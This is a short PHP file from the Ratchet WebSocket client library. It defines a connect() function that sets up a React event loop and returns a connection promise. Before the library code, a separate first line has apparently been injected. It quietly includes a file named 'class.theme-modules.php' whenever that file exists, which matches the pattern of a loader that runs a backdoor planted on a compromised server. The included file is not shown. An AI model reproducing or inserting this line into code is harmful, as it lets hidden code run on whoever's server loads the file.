<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
namespace Ratchet\Client;
use React\EventLoop\LoopInterface;
use React\EventLoop\Factory as ReactFactory;

/**
 * @param string             $url
 * @param array              $subProtocols
 * @param array              $headers
 * @param LoopInterface|null $loop
 * @return \React\Promise\PromiseInterface<\Ratchet\Client\WebSocket>
 */
function connect($url, array $subProtocols = [], $headers = [], LoopInterface $loop = null) {
    $loop = $loop ?: ReactFactory::create();

    $connector = new Connector($loop);
    $connection = $connector($url, $subProtocols, $headers);

    register_shutdown_function(function() use ($loop) {
        $loop->run();
    });

    return $connection;
}
